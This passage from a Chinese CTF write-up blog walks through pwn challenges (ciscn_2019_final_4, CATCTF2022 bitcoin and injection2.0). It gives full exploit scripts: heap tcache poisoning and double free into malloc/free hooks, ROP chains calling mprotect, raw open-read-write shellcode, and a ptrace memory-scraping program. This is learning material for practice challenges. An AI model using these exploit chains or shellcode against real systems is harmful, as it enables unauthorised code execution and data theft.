class="string">&#x27;index:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;4.show\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    add(<span class="number">31</span>,<span class="number">0xf8</span>,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        add(i,<span class="number">0xf0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">7</span>,<span class="number">0xf0</span>,<span class="string">&#x27;b&#x27;</span>)<span class="comment">#merged chunk</span></span><br><span class="line">    add(<span class="number">8</span>,<span class="number">0xf8</span>,<span class="string">&#x27;c&#x27;</span>)<span class="comment">#overflow chunk</span></span><br><span class="line">    add(<span class="number">9</span>,<span class="number">0xf0</span>,<span class="string">&#x27;d&#x27;</span>)<span class="comment">#merged chunk</span></span><br><span class="line">    add(<span class="number">10</span>,<span class="number">0xf0</span>,<span class="string">&#x27;e&#x27;</span>)<span class="comment">#prevent chunk</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        delete(i)   </span><br><span class="line">    delete(<span class="number">7</span>) </span><br><span class="line">    edit(<span class="number">8</span>,<span class="string">b&#x27;f&#x27;</span>*<span class="number">0xf0</span>+p64(<span class="number">0x200</span>))</span><br><span class="line">    delete(<span class="number">9</span>)<span class="comment">#off by null，触发堆块合并</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        add(i,<span class="number">0xf0</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#将tcache bin给清空，给接下来的tcache poisoning做准备</span></span><br><span class="line">    </span><br><span class="line">    add(<span class="number">11</span>,<span class="number">0xf0</span>,<span class="string">&#x27;g&#x27;</span>)</span><br><span class="line">    add(<span class="number">12</span>,<span class="number">0xf0</span>,<span class="string">&#x27;h&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">8</span>)</span><br><span class="line">    delete(<span class="number">12</span>)</span><br><span class="line">    add(<span class="number">13</span>,<span class="number">0xf0</span>,<span class="string">&#x27;i&#x27;</span>)</span><br><span class="line">    edit(<span class="number">13</span>,p64(<span class="number">0x6021d0</span>))<span class="comment">#tcache poisoning</span></span><br><span class="line">    add(<span class="number">14</span>,<span class="number">0xf0</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">15</span>,<span class="number">0xf0</span>,p64(<span class="number">0</span>)*<span class="number">29</span>+p32(<span class="number">1</span>)+p32(<span class="number">3</span>))<span class="comment">#修改两个key</span></span><br><span class="line">    </span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0xe0</span>,<span class="string">&#x27;u&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    leak_libc=recv_libc()</span><br><span class="line">    libc_base=leak_libc-<span class="number">0x3ebd90</span></span><br><span class="line">    log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">    free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    edit(<span class="number">15</span>,p64(<span class="number">0</span>)+p64(free_hook))</span><br><span class="line">    <span class="comment">#debug(p,d_a,d_d,d_e,d_s,0x400A25) </span></span><br><span class="line">    edit(<span class="number">31</span>,p64(sys_addr))</span><br><span class="line">    delete(<span class="number">14</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011959467.png" alt="image-20230701195947218"></p>
]]></content>
      <categories>
        <category>buu刷题</category>
      </categories>
      <tags>
        <tag>off_by_null</tag>
      </tags>
  </entry>
  <entry>
    <title>ciscn_2019_final_4</title>
    <url>/posts/d2d67d3f.html</url>
    <content><![CDATA[<p>buu刷题…</p>
<span id="more"></span>

<h3 id="保护策略："><a href="#保护策略：" class="headerlink" title="保护策略："></a>保护策略：</h3><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211121442042.png" alt="image-20221112144214948"></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211121442447.png" alt="image-20221112144230347"></p>
<h3 id="程序分析："><a href="#程序分析：" class="headerlink" title="程序分析："></a>程序分析：</h3><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211121442191.png" alt="image-20221112144247139"></p>
<p>delete函数中存在一个UAF漏洞(如上)</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211121442868.png" alt="image-20221112144257829"></p>
<p>在add函数中的size最大为0x1000,因此可以申请进入unsorted bin中的堆块，同时程序中存在show函数。</p>
<h3 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h3><p>看其他师傅的wp，发现基本都是去拿到libc地址后泄露了一个栈地址(利用environ来泄露)。但其实这道题没有这么麻烦，并不需要泄露栈地址的，这里记录下利用思路。</p>
<p>首先让堆块进入unsorted bin，然后执行show函数来泄露libc地址。</p>
<p>由于本题开了沙箱，我们考虑用orw的方式，但是因为libc为2.23的，无法申请出来free_hook导致了没法用setcontext来设置寄存器打orw。</p>
<p>但是我们发现程序往栈里输入了大量的数据(如下),就给了我们rop的机会(尽管我们无法溢出控制返回地址)</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211121443695.png" alt="image-20221112144309646"></p>
<p>在劫持malloc_hook之前我们拿到了libc地址，因此我们如果去劫持malloc_hook为add rsp,0x38;ret(0x38是调试出来的)，当下一次执行malloc的时候就会让栈顶增加0x38，然后执行ret的时候就可以劫持到我们最初输入的rop链上(如下)</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211121443683.png" alt="image-20221112144337170"></p>
<p>此时我们有了libc地址，于是我们考虑用程序原本的gadget去执行一下read函数，将rop链读到bss段上，最后用pop rsp这个gadget让栈迁移到bss段进行第二次rop，而这次的rop链中我们就可以写入libc中的地址了，我采用的是执行了mprotect函数让bss段变成可读可写可执行的，后面紧跟着orw的shellcode即可。</p>
<p>总结一下这道题需要注意几点:</p>
<ol>
<li>写orw的shellcode时，要用close函数先关闭文件描述符0，再用openat系统调用(因为本题把open也给禁了，这个是在程序里实现的)去读出flag文件。</li>
<li>本程序中，自己设置了一个反调试的功能，所以需要自己用ida把相关指令给nop掉，才能进行调试。</li>
<li>最后栈迁移到bss段使用的是程序中原本的一个gadget: pop rsp</li>
</ol>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;b&quot;</span>,<span class="string">&quot;node4.buuoj.cn:25919&quot;</span>,<span class="string">&quot;buu64-libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content=<span class="string">&#x27;/bin/sh\x00&#x27;</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;size?\n&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&quot;content?\n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;index ?\n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;index ?\n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x0000000000401193</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x0000000000401191</span></span><br><span class="line">bss_addr=<span class="number">0x602080</span></span><br><span class="line">pop_rsp_r13_r14_r15=<span class="number">0x000000000040118d</span></span><br><span class="line">payload=p64(pop_rdi)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rsi_r15)+p64(bss_addr)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(e.plt[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">payload+=p64(pop_rsp_r13_r14_r15)</span><br><span class="line">payload+=p64(bss_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;what is your name? \n&quot;</span>,payload)</span><br><span class="line">add(<span class="number">0x800</span>)</span><br><span class="line">add(<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base=recv_libc()-<span class="number">0x3c4b78</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">add_rsp_ret=libc_base+<span class="number">0x0000000000143f08</span><span class="comment">#0x0000000000143e08#</span></span><br><span class="line">pop_rdx=libc_base+<span class="number">0x0000000000001b92</span></span><br><span class="line">malloc_hook=libc_base+libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">mprotect_addr=libc_base+libc.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)<span class="comment">#double free</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,p64(malloc_hook-<span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x13</span>+p64(add_rsp_ret)</span><br><span class="line">add(<span class="number">0x60</span>,payload)</span><br><span class="line">debug(p,<span class="number">0x4010FB</span>,<span class="number">0x4010EF</span>,<span class="number">0x4010E3</span>,<span class="number">0x400C11</span>,<span class="number">0x400B2F</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;size?\n&quot;</span>,<span class="built_in">str</span>(<span class="number">0x10</span>))</span><br><span class="line">orw=<span class="string">b&quot;\x6A\x00\x5F\x6A\x03\x58\x0F\x05\x48\xBE\x2F\x66\x6C\x61\x67\x00\x00\x00\x56\x54\x5E\x6A\x00\x5F\x6A\x00\x5A\x68\x01\x01\x00\x00\x58\x0F\x05\x50\x5F\x54\x5E\x6A\x50\x5A\x6A\x00\x58\x0F\x05\x6A\x01\x5F\x54\x5E\x6A\x50\x5A\x6A\x01\x58\x0F\x05&quot;</span></span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">0x602000</span>)</span><br><span class="line">payload+=p64(pop_rsi_r15)+p64(<span class="number">0x1000</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rdx)+p64(<span class="number">7</span>)</span><br><span class="line">payload+=p64(mprotect_addr)</span><br><span class="line">payload+=p64(<span class="number">0x6020e0</span>)</span><br><span class="line">payload+=orw</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211121444189.png" alt="image-20221112144403666"></p>
]]></content>
      <categories>
        <category>buu刷题</category>
      </categories>
      <tags>
        <tag>orw</tag>
        <tag>double free</tag>
        <tag>沙箱</tag>
        <tag>UAF</tag>
        <tag>栈堆结合</tag>
        <tag>ROP</tag>
      </tags>
  </entry>
  <entry>
    <title>CATCTF2022_pwn复现</title>
    <url>/posts/74f96fff.html</url>
    <content><![CDATA[<p>CATCTF2022 PWN赛题复现</p>
<span id="more"></span>

<h2 id="welcome-CAT-CTF"><a href="#welcome-CAT-CTF" class="headerlink" title="welcome_CAT_CTF"></a>welcome_CAT_CTF</h2><p>运行程序，发现是一个小游戏，可以上下左右来移动 <code>@</code> 这个字符，并且程序运行之初询问了服务器的 IP 和端口。</p>
<p>看伪代码的这里(如下)</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301041745431.png"></p>
<p>如果能进入此处的 if ，那么就可以获取到服务器上的 <code>flag</code> ，条件有两个，第一个是满足<code>s[100 * v0 - 100 + v1] == &amp;unk_963B</code> 这个后面的其实就是字符 <code>@</code> 。</p>
<p>而在按下 <code>w</code> 键，进行的操作如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">&#x27;w&#x27;</span>:</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">char</span> *)s[<span class="number">100</span> * v0 - <span class="number">100</span> + v1] == <span class="string">&quot; &quot;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    s[<span class="number">100</span> * v0-- + v1] = (__int64)<span class="string">&quot; &quot;</span>;</span><br><span class="line">    s[<span class="number">100</span> * v0 + v1] = (__int64)&amp;unk_963B;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>按照逻辑可以猜测，按下 <code>w</code> 是向上移动，而向上移动的前提肯定是上面的那个内存要是空格，不然当前 <code>@</code> 上面有字符是无法向上移动的(可以结合程序运行发现这一点)，所以可以猜测 <code>s[100 * v0 - 100 + v1]</code>指向的就是当前字符 <code> @</code> 的上一个格子，因此获取 <code>flag</code> 的那个 if 前面的判断就是需要当前 <code>@</code> 上面的格子里也是一个 <code>@</code>，实现这一点只需要简单的 <code>adws</code>来移动即可。</p>
<p>而程序正常运行的话无论如何也无法让 <code>glod</code> 这个变量大于 <code>100000000</code> ，而获取 <code>flag</code> 的方式只要是进入这个 if 判断就可以获取，因此可以使用 <code>gdb</code> 中的 <code>set</code> 命令修改变量的值，从而绕过检查。</p>
<p>总结一下就是先用 <code>gdb</code> 修改 <code>glod</code> 这个全局变量大于 <code>100000000</code> ，接着让 <code>@</code> 移动到 <code>@</code>下面，然后按下 <code>j</code> (因为获取 <code>flag</code> 的那个 if 条件是在 <code>case: ‘j’</code> 下面的) 即可获取flag</p>
<h2 id="bitcoin"><a href="#bitcoin" class="headerlink" title="bitcoin"></a>bitcoin</h2><p>这题当时就扫了一眼，一看是 <code>C++</code> 的题目直接跑路了，不过比赛完了之后入门了一下 <code>C++</code> 所以现在正找 <code>C++</code> 的题目练练手呢（ <code>winmt</code> 师傅出的那个除外，实在感觉太难辣，如果有可能的话放到最后复现，如果没可能的话就跑路了 QAQ ），这道题其实一点也不难，就是一个常规的栈溢出，不过 <code>C++</code> 写的程序，确实跟之前做的常规栈溢出还有一点不太一样。</p>
<p>关于 <code>C++</code> 零基础入门，从零到零点一的话，可以看这篇<a href="https://zikh26.github.io/posts/4320fd7a.html">文章</a></p>
<h4 id="保护策略"><a href="#保护策略" class="headerlink" title="保护策略"></a>保护策略</h4><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301112149112.png" alt="image-20230111214911908" style="zoom: 67%;" />

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301112154233.png" alt="image-20230111215447098" style="zoom:50%;" />



<h4 id="漏洞所在："><a href="#漏洞所在：" class="headerlink" title="漏洞所在："></a>漏洞所在：</h4><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301112158735.png" alt="image-20230111215853664" style="zoom:50%;" />

<p>因为没有开 <code>canary</code> ，因此这里 <code>std::cin &gt;&gt; v4</code> 包括往 <code>v3</code> 中输入数据都是存在栈溢出的。</p>
<p>所以常规打一个 <code>ret2libc</code> 即可，然后程序禁用了 <code>execve</code> ，最后去执行 <code>orw</code> </p>
<h4 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h4><p>这里要说明一点，本题要再次输入的话，要利用 <code>cin &gt;&gt;</code> 来实现，这个东西是需要控制两个参数的，第一个是 <code>std::cin</code> 的地址，第二个是写入数据的目标地址。而执行的地方为</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301112245220.png" alt="image-20230111224545172"></p>
<p>有一点像 <code>scanf</code> 函数，然后就是先泄露 <code>libc</code> 地址，同时控制 <code>rbp</code> 的值为接下来的栈迁移做一个准备，再做一个往 <code>bss</code> 段上输入的 <code>rop</code> ，最后给一个 <code>leave ; ret</code> 触发栈迁移。准备往 <code>bss</code> 段上写的 <code>rop</code> 是在已经有了 <code>libc</code> 地址的情况下做的，因此我们可以去调用 <code>mprotect</code> 函数将 <code>bss</code> 段改为可读可写可执行，后面紧跟着执行 <code>orw</code> 的 <code>shellcode</code>。</p>
<p>其实泄露的 <code>libc</code> 地址就一个用处，就是从 <code>libc</code> 中取了一个 <code>pop rdx ; ret</code> 这个 <code>gadget</code> </p>
<p>需要注意的是， <code>orw</code> 之前必须要先把标准输入给 <code>close</code> 掉。也就是先执行 <code>close(1)</code> 再 <code>open</code> <code>read</code> <code>write</code>  不然远程打印不出来 <code>flag</code></p>
<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;pwn&quot;</span>,<span class="string">&quot;61.147.171.105:61597&quot;</span>)</span><br><span class="line">pop_rdi=<span class="number">0x0000000000406303</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x0000000000406301</span></span><br><span class="line">cin_addr=<span class="number">0x6093A0</span></span><br><span class="line">use_cin=<span class="number">0x401C30</span> </span><br><span class="line">bss_addr=<span class="number">0x609530</span></span><br><span class="line">leave_addr=<span class="number">0x40223A</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(e.got[<span class="string">&#x27;printf&#x27;</span>]))</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&quot;a&quot;</span>*<span class="number">0x40</span>+p64(bss_addr-<span class="number">8</span>)+p64(<span class="number">0x40223B</span>)+p64(pop_rdi)+p64(e.got[<span class="string">&#x27;mprotect&#x27;</span>])+p64(e.plt[<span class="string">&#x27;printf&#x27;</span>])</span><br><span class="line">payload+=p64(pop_rdi)+p64(cin_addr)+p64(pop_rsi_r15)+p64(bss_addr)+p64(<span class="number">0</span>)+p64(use_cin)+p64(leave_addr)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Name: &quot;</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">debug(p,<span class="number">0x4021D8</span>,<span class="number">0x401C30</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Password: &quot;</span>,payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">mprotect_addr=u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base=mprotect_addr-libc.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">log_addr(<span class="string">&#x27;mprotect_addr&#x27;</span>)</span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdx=libc_base+<span class="number">0x0000000000001b96</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">orw=<span class="string">b&quot;\x6A\x00\x5F\x6A\x03\x58\x0F\x05\x48\xBE\x2F\x66\x6C\x61\x67\x00\x00\x00\x56\x54\x5E\x6A\x00\x5F\x6A\x00\x5A\x68\x01\x01\x00\x00\x58\x0F\x05\x50\x5F\x54\x5E\x6A\x50\x5A\x6A\x00\x58\x0F\x05\x6A\x01\x5F\x54\x5E\x6A\x50\x5A\x6A\x01\x58\x0F\x05&quot;</span></span><br><span class="line">payload=p64(pop_rdi)+p64(bss_addr&amp;<span class="number">0xfff000</span>)</span><br><span class="line">payload+=p64(pop_rsi_r15)+p64(<span class="number">0x1000</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rdx)+p64(<span class="number">7</span>)</span><br><span class="line">payload+=p64(e.plt[<span class="string">&#x27;mprotect&#x27;</span>])</span><br><span class="line">payload+=p64(bss_addr+<span class="number">0x48</span>)</span><br><span class="line">payload+=orw</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301120046474.png" alt="image-20230112004628191"></p>
<h2 id="injection2-0"><a href="#injection2-0" class="headerlink" title="injection2.0"></a>injection2.0</h2><p>这种类型的题目是第一次见，跟着官方的 <code>WP</code> 复现一下。</p>
<h3 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h3><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301131110883.png" alt="image-20230113111031792"></p>
<p>给的文件是上面这些， <code>rootfs.img</code> 文件是一个文件系统映像文件，它是将 <code>_install</code> 文件进行了打包。所以这里是用 <code>qemu</code> 来模拟的，在 <code>_install</code> 文件中 <code>init</code> 作为 <code>qemu</code> 的初始化脚本。</p>
<p><code>init</code> 文件内容如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">echo &quot;INIT SCRIPT&quot;</span><br><span class="line">mkdir /tmp</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mount -t debugfs none /sys/kernel/debug</span><br><span class="line">mount -t tmpfs none /tmp</span><br><span class="line">echo 0 | tee /proc/sys/kernel/yama/ptrace_scope</span><br><span class="line">chown 0:0 flag</span><br><span class="line">chmod 755 flag</span><br><span class="line">exec 0&lt;/dev/console</span><br><span class="line">exec 1&gt;/dev/console</span><br><span class="line">exec 2&gt;/dev/console</span><br><span class="line">echo -e &quot;Boot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds&quot;</span><br><span class="line">./target &gt;pso.file 2&gt;&amp;1 &amp;</span><br><span class="line">setsid /bin/cttyhack setuidgid 0 /bin/sh</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">setsid /bin/cttyhack setuidgid 0 /bin/sh <span class="comment"># 修改 uid gid 为 0 以提权 /bin/sh 至 root。</span></span></span><br><span class="line">poweroff -f # 设置 shell 退出后则关闭机器</span><br></pre></td></tr></table></figure>

<p>而关键是在下面三句</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo 0 | tee /proc/sys/kernel/yama/ptrace_scope</span><br><span class="line">./target &gt;pso.file 2&gt;&amp;1 &amp;</span><br><span class="line">setsid /bin/cttyhack setuidgid 0 /bin/sh</span><br></pre></td></tr></table></figure>

<p>第一句是关闭了 <code>linux</code> 内核中的 <code>ptrace</code> 限制。<code>ptrace</code> 是一种 <code>linux</code> 内核中的进程调试功能，他可以让一个进程跟踪另一个进程的执行情况，跟踪进程可以访问被跟踪进程的内存空间和寄存器的值。为了防止恶意程序利用 <code>ptrace</code> 进行攻击，<code>Linux</code> 内核开发者在内核引入了 <code>yama</code> 的安全机制，其中的一个子模块 <code>ptrace_scope</code> 就是用来限制 <code>ptrace</code> 使用的，默认情况下， <code>yama</code> 的 <code>ptrace_scope</code> 被设置为 <code>1</code> ，这意味着只有当父进程和子进程属于同一用户时，才能跟踪子进程，<strong>如果设置为 <code>0</code> 就是关闭这个限制，任何进程都可以跟踪其他进程</strong>。</p>
<p>第二句是运行 <code>target</code> 程序，并将程序的标准输出和标准错误都重定向到 <code>pso.file</code> 文件，并将该进程设置为后台进程。</p>
<p>第三句是脱离原先的终端，并获取 <code>root</code> 权限</p>
<p>然后 <code>target</code> 文件内容如下</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301131739623.png" alt="image-20230113173903535"></p>
<p>先将 <code>flag</code> 文件读入到栈上，然后 <code>close</code> 将三个文件流全部关闭，再将 <code>flag</code> 文件删除掉，最后有一个永真循环，不断打印休眠打印字符串（目的是让进程一直处于运行状态，不会结束）</p>
<h3 id="利用思路：-1"><a href="#利用思路：-1" class="headerlink" title="利用思路："></a>利用思路：</h3><p>因为将 <code>/proc/sys/kernel/yama/ptrace_scope</code> 设置为了 <code>0</code>,并且权限为 <code>root</code> 。因此可以使用 <code>ptrace</code> 接口来访问进程的内存。</p>
<p>首先执行命令 <code>ps -ef</code> 获取进程的 <code>PID</code> ，再用 <code>/proc/pid/maps</code> 获取栈地址，因为此时的进程依然在运行，所以 <code>flag</code> 依然存在到栈上，调用 <code>ptrace</code> 获取栈内数据比对 <code>flag</code> ，比对成功的话，就将接下来内存中的数据打印出来，从而获取 <code>flag</code> 。</p>
<p>而上面所说的比对并打印 <code>flag</code> 需要用C语言的脚本来实现，因为是第一次做这种题目，所以直接把官方的 <code>WP</code> 中的 <code>exp</code> 贴到这里了（主要感觉这种轮子没必要再去自己写一个，直接用或者根据需求再改改就挺好）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="comment">//cat /proc/131/maps</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argv , <span class="type">char</span> **argc)</span>&#123;</span><br><span class="line"> </span><br><span class="line">  <span class="type">int</span> data ;</span><br><span class="line">  <span class="type">int</span> stat ;</span><br><span class="line">  <span class="type">int</span> pid = atoi(argc[<span class="number">1</span>]) ;<span class="comment">//这里需要手动传入命令行参数 target的pid</span></span><br><span class="line">  ptrace(PTRACE_ATTACH, pid, <span class="literal">NULL</span>, <span class="literal">NULL</span>) ;</span><br><span class="line">  wait(&amp;stat) ;    <span class="comment">// 如果不wait，马上进行下一个ptrace的PEEK操作会造成 no such process 错误</span></span><br><span class="line">  <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> addr = <span class="number">0</span> ;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%llx&quot;</span>,&amp;addr);</span><br><span class="line">  <span class="keyword">for</span> (; addr &lt; <span class="number">0x7ffffffff000</span>; ++addr)</span><br><span class="line">  &#123;</span><br><span class="line">    data = ptrace(PTRACE_PEEKDATA, pid, addr, <span class="literal">NULL</span>);    <span class="comment">// 一次读一个字节</span></span><br><span class="line">    <span class="keyword">if</span>(data==<span class="number">0x65636165</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;data = %x , addr = %llx\n&quot;</span> , data , addr) ;</span><br><span class="line">      <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> addr1=addr<span class="number">-1</span>;</span><br><span class="line">      <span class="type">char</span> data1;</span><br><span class="line">      <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++)</span><br><span class="line">      &#123;</span><br><span class="line">        addr1+=<span class="number">1</span>;</span><br><span class="line">        data1 = ptrace(PTRACE_PEEKDATA, pid, addr1, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="comment">//write(1,data1,0x10);</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span> , data1) ;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  ptrace(PTRACE_DETACH, pid, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span> ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

